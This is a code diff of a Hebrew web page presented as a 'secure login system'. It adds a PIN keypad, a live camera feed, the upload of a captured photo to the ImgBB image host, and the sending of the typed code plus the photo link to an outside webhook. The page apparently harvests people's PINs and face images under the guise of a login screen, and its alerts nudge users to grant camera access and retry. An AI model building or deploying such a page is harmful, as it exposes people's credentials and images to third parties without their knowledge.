@@ -1,11 +1,228 @@
 <!DOCTYPE html>
-<html dir="rtl">
-<!-- הסטיילינג והמבנה HTML נשארים זהים, רק מעדכנים את הלוגיקה של הטיפול בתמונה -->
+<html dir="rtl" lang="he">
 <head>
-    <!-- החלק הקודם נשאר זהה -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>מערכת כניסה מאובטחת</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            padding: 20px;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        }
+
+        #videoContainer {
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            background: #000;
+            margin-bottom: 20px;
+            position: relative;
+            aspect-ratio: 4/3;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        #display {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            height: 60px;
+            font-size: 32px;
+            color: white;
+            text-align: center;
+            line-height: 60px;
+            margin: 20px 0;
+            letter-spacing: 5px;
+        }
+
+        #keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            padding: 10px;
+        }
+
+        .key {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            font-size: 24px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .key:active {
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(0.95);
+        }
+
+        .key.enter {
+            background: #4CAF50;
+        }
+
+        .key.clear {
+            background: #f44336;
+        }
+
+        #successOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            z-index: 1000;
+        }
+
+        .success-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .success-content h2 {
+            color: #2a5298;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #4CAF50;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+        }
+
+        .close-button {
+            background: #2a5298;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2a5298;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 380px) {
+            .key {
+                padding: 15px;
+                font-size: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-    <!-- החלק הקודם נשאר זהה -->
+    <div class="container">
+        <div id="videoContainer">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+        </div>
+        
+        <div id="display"></div>
+        
+        <div id="keypad">
+            <button class="key">1</button>
+            <button class="key">2</button>
+            <button class="key">3</button>
+            <button class="key">4</button>
+            <button class="key">5</button>
+            <button class="key">6</button>
+            <button class="key">7</button>
+            <button class="key">8</button>
+            <button class="key">9</button>
+            <button class="key clear">C</button>
+            <button class="key">0</button>
+            <button class="key enter">⏎</button>
+        </div>
+    </div>
+
+    <div id="successOverlay">
+        <div class="success-content">
+            <div class="success-icon">✓</div>
+            <h2>הכניסה בוצעה בהצלחה!</h2>
+            <button class="close-button" onclick="closeSuccessOverlay()">סגור</button>
+        </div>
+    </div>
+
+    <div id="loader">
+        <div class="spinner"></div>
+    </div>
 
     <script>
         let code = '';
@@ -27,8 +244,10 @@
                     } 
                 });
                 video.srcObject = stream;
+                video.play();
             } catch (err) {
                 console.error('שגיאה בהפעלת המצלמה:', err);
+                alert('לא הצלחנו לגשת למצלמה. אנא ודא שנתת הרשאת גישה למצלמה.');
             }
         }
 
@@ -39,7 +258,6 @@
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            // המרת התמונה ל-Base64 ללא ה-header של Data URL
             const imageBase64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
             
             uploadToImgBB(imageBase64);
@@ -58,14 +276,15 @@
                 const data = await response.json();
                 
                 if (data.success) {
-                    // שליחת הקישור לתמונה לוובהוק
                     await sendDataToWebhook(code, data.data.url);
                 } else {
                     console.error('שגיאה בהעלאת התמונה:', data.error);
+                    alert('שגיאה בהעלאת התמונה, אנא נסה שנית');
                     loader.style.display = 'none';
                 }
             } catch (err) {
                 console.error('שגיאה בהעלאת התמונה:', err);
+                alert('שגיאה בהעלאת התמונה, אנא נסה שנית');
                 loader.style.display = 'none';
             }
         }
@@ -89,6 +308,7 @@
                 }
             } catch (err) {
                 console.error('שגיאה בשליחת הנתונים:', err);
+                alert('שגיאה בשליחת הנתונים, אנא נסה שנית');
                 loader.style.display = 'none';
             }
         }
@@ -121,7 +341,10 @@
             });
         });
 
-        startCamera();
+        // Start camera when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            startCamera();
+        });
     </script>
 </body>
 </html>
